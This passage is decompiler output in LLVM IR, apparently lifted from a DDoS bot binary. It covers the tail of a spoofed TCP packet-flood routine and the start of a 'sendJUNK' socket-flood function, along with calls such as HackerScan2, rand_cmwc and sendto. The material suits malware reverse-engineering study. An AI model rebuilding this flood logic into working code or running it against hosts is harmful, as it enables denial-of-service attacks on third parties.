dec_label_pc_804f462:                             ; preds = %dec_label_pc_804f441, %dec_label_pc_804f28c, %dec_label_pc_804f24b
  %v0_804f462 = phi i8* [ %v0_804f462.pre, %dec_label_pc_804f24b ], [ %v5_804f29f, %dec_label_pc_804f28c ], [ %tmp92, %dec_label_pc_804f441 ]
  %v1_804f462 = ptrtoint i8* %v0_804f462 to i32
  %v2_804f462 = call i32 @rand_cmwc(i32 %v1_804f462)
  %v1_804f467 = urem i32 %v2_804f462, 65536
  store i32 %v1_804f467, i32* %edx.global-to-local, align 4
  %v1_804f46d = trunc i32 %v2_804f462 to i16
  %v3_804f46d = add i32 %v2_804f18a, 34
  %v4_804f46d = inttoptr i32 %v3_804f46d to i16*
  store i16 %v1_804f46d, i16* %v4_804f46d, align 2
  %v1_804f474 = add i32 %v2_804f18a, 36
  %v2_804f474 = inttoptr i32 %v1_804f474 to i16*
  store i16 0, i16* %v2_804f474, align 4
  store i32 %v1_804f1a2, i32* %eax.global-to-local, align 4
  %v1_804f47d = add i32 %v2_804f18a, 38
  %v2_804f47d = inttoptr i32 %v1_804f47d to i16*
  store i16 0, i16* %v2_804f47d, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804f05a, label %dec_label_pc_804f496, label %dec_label_pc_804f489

dec_label_pc_804f489:                             ; preds = %dec_label_pc_804f462
  %v0_804f489 = load i8*, i8** %stack_var_-20, align 4
  %v1_804f489 = ptrtoint i8* %v0_804f489 to i32
  %v2_804f489 = call i32 @rand_cmwc(i32 %v1_804f489)
  br label %dec_label_pc_804f4aa

dec_label_pc_804f496:                             ; preds = %dec_label_pc_804f462
  %v1_804f499 = urem i32 %arg2, 65536
  store i32 %v1_804f499, i32* %eax.global-to-local, align 4
  %v1_804f49c = load i32, i32* @esp, align 4
  %v2_804f49c = inttoptr i32 %v1_804f49c to i32*
  store i32 %v1_804f499, i32* %v2_804f49c, align 4
  %v3_804f49f = call i32 @htons(i16 %tmp39)
  br label %dec_label_pc_804f4aa

dec_label_pc_804f4aa:                             ; preds = %dec_label_pc_804f489, %dec_label_pc_804f496
  %storemerge12.in = phi i32 [ %v2_804f489, %dec_label_pc_804f489 ], [ %v3_804f49f, %dec_label_pc_804f496 ]
  %storemerge = trunc i32 %storemerge12.in to i16
  %sext = mul i32 %storemerge12.in, 65536
  %v4_804f4ad = sdiv i32 %sext, 65536
  store i32 %v4_804f4ad, i32* @esi, align 4
  %v3_804f4b0 = add i32 %v2_804f18a, 22
  %v4_804f4b0 = inttoptr i32 %v3_804f4b0 to i16*
  store i16 %storemerge, i16* %v4_804f4b0, align 2
  %v1_804f4b7 = load i32, i32* @esp, align 4
  %v2_804f4b7 = add i32 %v1_804f4b7, 4
  %v3_804f4b7 = inttoptr i32 %v2_804f4b7 to i32*
  store i32 %v1_804f1a2, i32* %v3_804f4b7, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v1_804f4be = load i32, i32* @esp, align 4
  %v2_804f4be = inttoptr i32 %v1_804f4be to i32*
  store i32 %v2_804f18a, i32* %v2_804f4be, align 4
  %v0_804f4c1 = call i32 @tcpcsum()
  %v1_804f4c6 = urem i32 %v0_804f4c1, 65536
  store i32 %v1_804f4c6, i32* %edx.global-to-local, align 4
  %v1_804f4cc = trunc i32 %v0_804f4c1 to i16
  store i16 %v1_804f4cc, i16* %v2_804f474, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v1_804f4d3 = or i32 %v2_804f18a, 2
  %v2_804f4d3 = inttoptr i32 %v1_804f4d3 to i16*
  %v3_804f4d3 = load i16, i16* %v2_804f4d3, align 2
  %v4_804f4d3 = zext i16 %v3_804f4d3 to i32
  store i32 %v4_804f4d3, i32* %edx.global-to-local, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v1_804f4dc = load i32, i32* @esp, align 4
  %v2_804f4dc = add i32 %v1_804f4dc, 4
  %v3_804f4dc = inttoptr i32 %v2_804f4dc to i32*
  store i32 %v4_804f4d3, i32* %v3_804f4dc, align 4
  %v0_804f4e0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f4e0 = load i32, i32* @esp, align 4
  %v2_804f4e0 = inttoptr i32 %v1_804f4e0 to i32*
  store i32 %v0_804f4e0, i32* %v2_804f4e0, align 4
  %v3_804f4e3 = inttoptr i32 %v4_804f4ad to i16*
  %v4_804f4e3 = call i32 @csum(i16* %v3_804f4e3, i32 %v15_804f03f)
  %v1_804f4e8 = urem i32 %v4_804f4e3, 65536
  store i32 %v1_804f4e8, i32* %edx.global-to-local, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v1_804f4ee = trunc i32 %v4_804f4e3 to i16
  %v3_804f4ee = or i32 %v2_804f18a, 10
  %v4_804f4ee = inttoptr i32 %v3_804f4ee to i16*
  store i16 %v1_804f4ee, i16* %v4_804f4ee, align 2
  %v0_804f4f2 = load i32, i32* @esp, align 4
  %v1_804f4f2 = inttoptr i32 %v0_804f4f2 to i32*
  store i32 0, i32* %v1_804f4f2, align 4
  %v2_804f4f9 = inttoptr i32 %v4_804f4ad to i32*
  %v3_804f4f9 = call i32 @__GI_time(i32* %v2_804f4f9)
  %v5_804f4fe = add i32 %v3_804f4f9, %arg3
  %v10_804f4fe = icmp ult i32 %v5_804f4fe, %v3_804f4f9
  store i1 %v10_804f4fe, i1* %cf.global-to-local, align 1
  store i32 %v5_804f4fe, i32* %eax.global-to-local, align 4
  %v2_804f555 = or i32 %v2_804f18a, 12
  %v3_804f555 = inttoptr i32 %v2_804f555 to i32*
  %v3_804f563 = or i32 %v2_804f18a, 4
  %v4_804f563 = inttoptr i32 %v3_804f563 to i16*
  br label %dec_label_pc_804f50d

dec_label_pc_804f50d:                             ; preds = %dec_label_pc_804f5d1, %dec_label_pc_804f5ee, %dec_label_pc_804f4aa
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804f4aa ], [ %v4_804f5ee, %dec_label_pc_804f5ee ], [ 0, %dec_label_pc_804f5d1 ]
  store i32 %v2_804f18a, i32* %edx.global-to-local, align 4
  %v0_804f513 = load i32, i32* @esp, align 4
  %v1_804f513 = add i32 %v0_804f513, 20
  %v2_804f513 = inttoptr i32 %v1_804f513 to i32*
  store i32 16, i32* %v2_804f513, align 4
  %v1_804f51b = load i32, i32* @esp, align 4
  %v2_804f51b = add i32 %v1_804f51b, 16
  %v3_804f51b = inttoptr i32 %v2_804f51b to i32*
  store i32 %v2_804f07f, i32* %v3_804f51b, align 4
  %v0_804f51f = load i32, i32* @esp, align 4
  %v1_804f51f = add i32 %v0_804f51f, 12
  %v2_804f51f = inttoptr i32 %v1_804f51f to i32*
  store i32 0, i32* %v2_804f51f, align 4
  store i32 %v1_804f166, i32* @edi, align 4
  %v1_804f52a = load i32, i32* @esp, align 4
  %v2_804f52a = add i32 %v1_804f52a, 8
  %v3_804f52a = inttoptr i32 %v2_804f52a to i32*
  store i32 %v1_804f166, i32* %v3_804f52a, align 4
  %v0_804f52e = load i32, i32* %edx.global-to-local, align 4
  %v1_804f52e = load i32, i32* @esp, align 4
  %v2_804f52e = add i32 %v1_804f52e, 4
  %v3_804f52e = inttoptr i32 %v2_804f52e to i32*
  store i32 %v0_804f52e, i32* %v3_804f52e, align 4
  store i32 %v5_804f0c7, i32* %eax.global-to-local, align 4
  %v1_804f535 = load i32, i32* @esp, align 4
  %v2_804f535 = inttoptr i32 %v1_804f535 to i32*
  store i32 %v5_804f0c7, i32* %v2_804f535, align 4
  %v1_804f538 = load i32, i32* %stack_var_-64, align 4
  %v2_804f538 = load i32, i32* %stack_var_-60, align 4
  %v3_804f538 = load i32, i32* %stack_var_-56, align 4
  %v4_804f538 = load i32, i32* %stack_var_-52, align 4
  %v6_804f538 = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804f538, i32 %v2_804f538, i32 %v3_804f538, i32 %v4_804f538, i32 0)
  store i32 %storemerge10, i32* @eax, align 4
  %v1_804f540 = load i32, i32* @esp, align 4
  %v2_804f540 = inttoptr i32 %v1_804f540 to i32*
  store i32 %storemerge10, i32* %v2_804f540, align 4
  %v1_804f543 = call i32 @HackerScan2(i32 %stack_var_-68.0)
  store i32 %v1_804f543, i32* %eax.global-to-local, align 4
  %v1_804f548 = load i32, i32* @esp, align 4
  %v2_804f548 = inttoptr i32 %v1_804f548 to i32*
  store i32 %v1_804f543, i32* %v2_804f548, align 4
  %v0_804f54b = call i32 @htonl()
  store i32 %v0_804f54b, i32* %edx.global-to-local, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  store i32 %v0_804f54b, i32* %v3_804f555, align 4
  %v1_804f558 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804f55d = urem i32 %v1_804f558, 65536
  store i32 %v1_804f55d, i32* %edx.global-to-local, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v1_804f563 = trunc i32 %v1_804f558 to i16
  store i16 %v1_804f563, i16* %v4_804f563, align 4
  %v1_804f567 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804f567, i32* %edx.global-to-local, align 4
  store i32 %v1_804f1a2, i32* %eax.global-to-local, align 4
  store i32 %v1_804f567, i32* %v3_804f1fd, align 8
  %v1_804f574 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804f579 = urem i32 %v1_804f574, 65536
  store i32 %v1_804f579, i32* %edx.global-to-local, align 4
  %v1_804f57f = trunc i32 %v1_804f574 to i16
  store i16 %v1_804f57f, i16* %v5_804f1a5, align 4
  store i16 0, i16* %v2_804f474, align 4
  %v1_804f58e = load i32, i32* @esp, align 4
  %v2_804f58e = add i32 %v1_804f58e, 4
  %v3_804f58e = inttoptr i32 %v2_804f58e to i32*
  store i32 %v1_804f1a2, i32* %v3_804f58e, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v1_804f595 = load i32, i32* @esp, align 4
  %v2_804f595 = inttoptr i32 %v1_804f595 to i32*
  store i32 %v2_804f18a, i32* %v2_804f595, align 4
  %v0_804f598 = call i32 @tcpcsum()
  %v1_804f59d = urem i32 %v0_804f598, 65536
  store i32 %v1_804f59d, i32* %edx.global-to-local, align 4
  %v1_804f5a3 = trunc i32 %v0_804f598 to i16
  store i16 %v1_804f5a3, i16* %v2_804f474, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v3_804f5aa = load i16, i16* %v2_804f4d3, align 2
  %v4_804f5aa = zext i16 %v3_804f5aa to i32
  store i32 %v4_804f5aa, i32* %edx.global-to-local, align 4
  store i32 %v2_804f18a, i32* %eax.global-to-local, align 4
  %v1_804f5b3 = load i32, i32* @esp, align 4
  %v2_804f5b3 = add i32 %v1_804f5b3, 4
  %v3_804f5b3 = inttoptr i32 %v2_804f5b3 to i32*
  store i32 %v4_804f5aa, i32* %v3_804f5b3, align 4
  %v0_804f5b7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f5b7 = load i32, i32* @esp, align 4
  %v2_804f5b7 = inttoptr i32 %v1_804f5b7 to i32*
  store i32 %v0_804f5b7, i32* %v2_804f5b7, align 4
  %v1_804f5ba = load i32, i32* %stack_var_-64, align 4
  %v2_804f5ba = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804f5ba = call i32 @csum(i16* %v2_804f5ba, i32 %v1_804f5ba)
  %v1_804f5bf = urem i32 %v3_804f5ba, 65536
  store i32 %v1_804f5bf, i32* %edx.global-to-local, align 4
  %v1_804f5c5 = trunc i32 %v3_804f5ba to i16
  store i16 %v1_804f5c5, i16* %v4_804f4ee, align 2
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v10_804f5cc = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804f5cc, i1* %cf.global-to-local, align 1
  %v15_804f5cc = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804f5cf = icmp eq i1 %v15_804f5cc, false
  br i1 %v1_804f5cf, label %dec_label_pc_804f5ee, label %dec_label_pc_804f5d1

dec_label_pc_804f5d1:                             ; preds = %dec_label_pc_804f50d
  %v0_804f5d1 = load i32, i32* @esp, align 4
  %v1_804f5d1 = inttoptr i32 %v0_804f5d1 to i32*
  store i32 0, i32* %v1_804f5d1, align 4
  %v1_804f5d8 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804f5d8 = call i32 @__GI_time(i32* %v1_804f5d8)
  store i32 %v2_804f5d8, i32* %eax.global-to-local, align 4
  %v10_804f5dd = icmp ult i32 %v2_804f5d8, %v5_804f4fe
  store i1 %v10_804f5dd, i1* %cf.global-to-local, align 1
  %v8_804f5e0 = icmp sgt i32 %v2_804f5d8, %v5_804f4fe
  br i1 %v8_804f5e0, label %dec_label_pc_804f5f6, label %dec_label_pc_804f50d

dec_label_pc_804f5ee:                             ; preds = %dec_label_pc_804f50d
  %v4_804f5ee = add i32 %stack_var_-68.0, 1
  br label %dec_label_pc_804f50d

dec_label_pc_804f5f6:                             ; preds = %dec_label_pc_804f5d1, %dec_label_pc_804f07f, %dec_label_pc_804f124, %dec_label_pc_804f0d5
  %v0_804f600 = phi i32 [ %v5_804f08f, %dec_label_pc_804f07f ], [ %v4_804f134, %dec_label_pc_804f124 ], [ %v4_804f0e5, %dec_label_pc_804f0d5 ], [ %v2_804f5d8, %dec_label_pc_804f5d1 ]
  store i32 %v0_804f03e, i32* @ebx, align 4
  store i32 %v0_804f03d, i32* @esi, align 4
  ret i32 %v0_804f600

; uselistorder directives
  uselistorder i32 %v3_804f5ba, { 1, 0 }
  uselistorder i32 %v0_804f598, { 1, 0 }
  uselistorder i32 %v1_804f574, { 1, 0 }
  uselistorder i32 %v1_804f558, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v5_804f4fe, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804f4f9, { 1, 0 }
  uselistorder i32 %v4_804f4e3, { 1, 0 }
  uselistorder i32 %v0_804f4c1, { 1, 0 }
  uselistorder i32 %v4_804f4ad, { 2, 1, 0 }
  uselistorder i32 %v1_804f499, { 1, 0 }
  uselistorder i32 %v2_804f462, { 1, 0 }
  uselistorder i32 %stack_var_-160.0, { 1, 0 }
  uselistorder i8* %stack_var_-156.0, { 1, 0 }
  uselistorder i1 %v0_804f402, { 1, 0 }
  uselistorder i32 %v7_804f400, { 1, 0 }
  uselistorder i1 %v0_804f3ae, { 1, 0 }
  uselistorder i32 %v7_804f3ac, { 1, 0 }
  uselistorder i1 %v0_804f357, { 1, 0 }
  uselistorder i32 %v7_804f355, { 1, 0 }
  uselistorder i1 %v0_804f30c, { 1, 0 }
  uselistorder i32 %v7_804f30a, { 1, 0 }
  uselistorder i1 %v0_804f2c7, { 1, 0 }
  uselistorder i32 %v7_804f2c5, { 1, 0 }
  uselistorder i32 %v4_804f2a7, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 10, 11 }
  uselistorder i8* %stack_var_-156.125, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-160.126, { 3, 2, 1, 0 }
  uselistorder i8* %v3_804f42a, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_804f418, { 4, 9, 3, 8, 2, 7, 1, 6, 0, 5 }
  uselistorder i8* %v2_804f24e, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i1 %v0_804f238, { 1, 0 }
  uselistorder i32 %v7_804f236, { 1, 0 }
  uselistorder i32 %v2_804f1e5, { 1, 0 }
  uselistorder i32 %v1_804f1a2, { 5, 6, 7, 8, 0, 1, 2, 3, 4, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 %v2_804f18a, { 14, 13, 11, 12, 10, 9, 8, 26, 25, 24, 7, 6, 23, 5, 3, 4, 22, 21, 20, 19, 27, 18, 17, 16, 15, 1, 2, 0 }
  uselistorder i32 %v1_804f166, { 1, 0, 2 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804f15c, { 1, 0 }
  uselistorder i32 %v5_804f0c7, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v1_804f06d, { 1, 0 }
  uselistorder i32 %v15_804f03f, { 1, 0 }
  uselistorder i8** %stack_var_-188, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 3, 2 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 30, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 46, 31, 32, 33, 34, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 48, 47, 50, 49, 51, 52, 54, 53, 56, 55, 57, 58 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 18, 4, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 38, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 3, 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @HackerScan2, { 3, 2, 1, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f5f6, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804f50d, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804f4aa, { 1, 0 }
  uselistorder label %dec_label_pc_804f441, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804f2a7, { 1, 0 }
  uselistorder label %dec_label_pc_804f163, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %dec_label_pc_804f07f, { 1, 0 }
}

define i32 @sendJUNK(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804f604 = load i32, i32* @edi, align 4
  %v0_804f605 = load i32, i32* @ebx, align 4
  store i32 %v0_804f605, i32* %stack_var_-12, align 4
  %v12_804f606 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v12_804f606, i32* %eax.global-to-local, align 4
  %v1_804f614 = call i32 @getdtablesize(i32 %v12_804f606)
  store i32 %v1_804f614, i32* @edx, align 4
  %tmp = icmp slt i32 %v1_804f614, 0
  %v2_804f61d = zext i1 %tmp to i32
  %v2_804f620 = add i32 %v2_804f61d, %v1_804f614
  %v2_804f622 = sdiv i32 %v2_804f620, 2
  store i32 2, i32* %stack_var_-60, align 4
  %v1_804f630 = urem i32 %arg2, 65536
  store i32 %v1_804f630, i32* %eax.global-to-local, align 4
  store i32 %v1_804f630, i32* %stack_var_-236, align 4
  %v1_804f636 = trunc i32 %arg2 to i16
  %v2_804f636 = call i32 @htons(i16 %v1_804f636)
  %v2_804f642 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-236, align 4
  %v3_804f652 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v3_804f652, i32* %eax.global-to-local, align 4
  %v1_804f657 = icmp eq i32 %v3_804f652, 0
  br i1 %v1_804f657, label %dec_label_pc_804f660, label %dec_label_pc_804f9d4

dec_label_pc_804f660:                             ; preds = %entry
  %v2_804f676 = mul i32 %v2_804f622, 8
  %v1_804f67c = add i32 %v2_804f676, 30
  %v2_804f67f = and i32 %v1_804f67c, -16
  %v0_804f685 = load i32, i32* @esp, align 4
  %v2_804f685 = sub i32 %v0_804f685, %v2_804f67f
  %v1_804f697 = add i32 %v2_804f685, 35
  %v2_804f69a = and i32 %v1_804f697, -16
  %v2_804f6b7 = mul i32 %v2_804f622, 5
  store i32 %v2_804f6b7, i32* %edx.global-to-local, align 4
  %v1_804f6bd = inttoptr i32 %v2_804f69a to i8*
  store i32 %v2_804f69a, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804f6c2 = and i32 %v1_804f697, -256
  store i32 %v1_804f6c2, i32* %eax.global-to-local, align 4
  %v5_804f6c4 = call i8* @_memset(i8* %v1_804f6bd, i32 %v1_804f6c2, i32 %v2_804f6b7)
  %v0_804f6c6 = load i32, i32* @esp, align 4
  %v1_804f6c6 = inttoptr i32 %v0_804f6c6 to i32*
  store i32 1024, i32* %v1_804f6c6, align 4
  %v1_804f6cd = call i32 @malloc(i32 %v2_804f69a)
  store i32 %v1_804f6cd, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804f6df = load i32, i32* @esp, align 4
  %v2_804f6df = add i32 %v1_804f6df, 8
  %v3_804f6df = inttoptr i32 %v2_804f6df to i32*
  store i32 1024, i32* %v3_804f6df, align 4
  %v0_804f6e3 = load i32, i32* @esp, align 4
  %v1_804f6e3 = add i32 %v0_804f6e3, 4
  %v2_804f6e3 = inttoptr i32 %v1_804f6e3 to i32*
  store i32 0, i32* %v2_804f6e3, align 4
  %v0_804f6eb = load i32, i32* %edx.global-to-local, align 4
  %v1_804f6eb = load i32, i32* @esp, align 4
  %v2_804f6eb = inttoptr i32 %v1_804f6eb to i32*
  store i32 %v0_804f6eb, i32* %v2_804f6eb, align 4
  %v3_804f6ee = inttoptr i32 %v1_804f6cd to i8*
  %v4_804f6ee = call i32 @__GI_memset(i8* %v3_804f6ee, i32 %tmp7, i32 %tmp4)
  store i32 %v4_804f6ee, i32* %eax.global-to-local, align 4
  %v0_804f6f3 = load i32, i32* @esp, align 4
  %v1_804f6f3 = inttoptr i32 %v0_804f6f3 to i32*
  store i32 0, i32* %v1_804f6f3, align 4
  %v1_804f6fa = inttoptr i32 %v1_804f6cd to i32*
  %v2_804f6fa = call i32 @__GI_time(i32* %v1_804f6fa)
  %v5_804f6ff = add i32 %v2_804f6fa, %arg3
  store i32 %v5_804f6ff, i32* %eax.global-to-local, align 4
  %v3_804f71c = or i32 %v2_804f69a, 4
  %v2_804f820 = ptrtoint i32* %stack_var_-188 to i32
  %tmp31 = bitcast i32* %stack_var_-188 to i8*
  %v2_804f871 = ptrtoint i32* %stack_var_-196 to i32
  %v2_804f8b9 = ptrtoint i32* %stack_var_-200 to i32
  %v2_804f8c3 = ptrtoint i32* %stack_var_-204 to i32
  %v16_804f9b638 = icmp sgt i32 %v2_804f620, 1
  br label %dec_label_pc_804f9bf

dec_label_pc_804f716:                             ; preds = %dec_label_pc_804f9b3.preheader, %dec_label_pc_804f9b0
  %storemerge41 = phi i32 [ %v4_804f9b0, %dec_label_pc_804f9b0 ], [ 0, %dec_label_pc_804f9b3.preheader ]
  %stack_var_-192.140 = phi i32 [ %stack_var_-192.0, %dec_label_pc_804f9b0 ], [ %stack_var_-192.2, %dec_label_pc_804f9b3.preheader ]
  store i32 %storemerge41, i32* %eax.global-to-local, align 4
  store i32 %v2_804f69a, i32* %edx.global-to-local, align 4
  %v2_804f71c = mul i32 %storemerge41, 8
  %v4_804f71c = add i32 %v2_804f71c, %v3_804f71c
  %v5_804f71c = inttoptr i32 %v4_804f71c to i8*
  %v6_804f71c = load i8, i8* %v5_804f71c, align 4
  %v7_804f71c = zext i8 %v6_804f71c to i32
  store i32 %v7_804f71c, i32* %eax.global-to-local, align 4
  %v8_804f72a = icmp eq i8 %v6_804f71c, 0
  %v12_804f72a = icmp eq i8 %v6_804f71c, 1
  br i1 %v12_804f72a, label %dec_label_pc_804f816, label %dec_label_pc_804f737

dec_label_pc_804f737:                             ; preds = %dec_label_pc_804f716
  %v12_804f737 = icmp eq i8 %v6_804f71c, 2
  br i1 %v12_804f737, label %dec_label_pc_804f948, label %dec_label_pc_804f744

dec_label_pc_804f744:                             ; preds = %dec_label_pc_804f737
  br i1 %v8_804f72a, label %dec_label_pc_804f752, label %dec_label_pc_804f9b0

dec_label_pc_804f752:                             ; preds = %dec_label_pc_804f744
  store i32 %storemerge41, i32* @ebx, align 4
  %v0_804f755 = load i32, i32* @esp, align 4
  %v1_804f755 = add i32 %v0_804f755, 8
  %v2_804f755 = inttoptr i32 %v1_804f755 to i32*
  store i32 0, i32* %v2_804f755, align 4
  %v0_804f75d = load i32, i32* @esp, align 4
  %v1_804f75d = add i32 %v0_804f75d, 4
  %v2_804f75d = inttoptr i32 %v1_804f75d to i32*
  store i32 1, i32* %v2_804f75d, align 4
  %v0_804f765 = load i32, i32* @esp, align 4
  %v1_804f765 = inttoptr i32 %v0_804f765 to i32*
  store i32 2, i32* %v1_804f765, align 4
  %v2_804f76c = load i32, i32* %stack_var_-204, align 4
  %v3_804f76c = call i32 @socket(i32 %v7_804f71c, i32 %v12_804f606, i32 %v2_804f76c)
  %v2_804f776 = load i32, i32* @ebx, align 4
  %v3_804f776 = mul i32 %v2_804f776, 8
  %v4_804f776 = add i32 %v3_804f776, %v2_804f69a
  %v5_804f776 = inttoptr i32 %v4_804f776 to i32*
  store i32 %v3_804f76c, i32* %v5_804f776, align 8
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v3_804f77f = add i32 %v2_804f71c, %v2_804f69a
  %v4_804f77f = inttoptr i32 %v3_804f77f to i32*
  %v5_804f77f = load i32, i32* %v4_804f77f, align 8
  store i32 %v5_804f77f, i32* %eax.global-to-local, align 4
  %v0_804f782 = load i32, i32* @esp, align 4
  %v1_804f782 = add i32 %v0_804f782, 8
  %v2_804f782 = inttoptr i32 %v1_804f782 to i32*
  store i32 0, i32* %v2_804f782, align 4
  %v0_804f78a = load i32, i32* @esp, align 4
  %v1_804f78a = add i32 %v0_804f78a, 4
  %v2_804f78a = inttoptr i32 %v1_804f78a to i32*
  store i32 3, i32* %v2_804f78a, align 4
  %v0_804f792 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f792 = load i32, i32* @esp, align 4
  %v2_804f792 = inttoptr i32 %v1_804f792 to i32*
  store i32 %v0_804f792, i32* %v2_804f792, align 4
  %v2_804f795 = load i32, i32* %stack_var_-204, align 4
  %v3_804f795 = call i32 @__libc_fcntl(i32 %v7_804f71c, i32 %v12_804f606, i32 %v2_804f795)
  %v1_804f79c = or i32 %v3_804f795, 2048
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v5_804f7a8 = load i32, i32* %v4_804f77f, align 8
  store i32 %v5_804f7a8, i32* %eax.global-to-local, align 4
  %v1_804f7ab = load i32, i32* @esp, align 4
  %v2_804f7ab = add i32 %v1_804f7ab, 8
  %v3_804f7ab = inttoptr i32 %v2_804f7ab to i32*
  store i32 %v1_804f79c, i32* %v3_804f7ab, align 4
  %v0_804f7af = load i32, i32* @esp, align 4
  %v1_804f7af = add i32 %v0_804f7af, 4
  %v2_804f7af = inttoptr i32 %v1_804f7af to i32*
  store i32 4, i32* %v2_804f7af, align 4
  %v0_804f7b7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804f7b7 = load i32, i32* @esp, align 4
  %v2_804f7b7 = inttoptr i32 %v1_804f7b7 to i32*
  store i32 %v0_804f7b7, i32* %v2_804f7b7, align 4
  %v2_804f7ba = load i32, i32* %stack_var_-204, align 4
  %v3_804f7ba = call i32 @__libc_fcntl(i32 %v7_804f71c, i32 %v12_804f606, i32 %v2_804f7ba)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_804f69a, i32* %eax.global-to-local, align 4
  %v5_804f7c8 = load i32, i32* %v4_804f77f, align 8
  store i32 %v5_804f7c8, i32* %eax.global-to-local, align 4
  %v0_804f7cb = load i32, i32* @esp, align 4
  %v1_804f7cb = add i32 %v0_804f7cb, 8
  %v2_804f7cb = inttoptr i32 %v1_804f7cb to i32*
  store i32 16, i32* %v2_804f7cb, align 4
  %v1_804f7d3 = load i32, i32* @esp, align 4
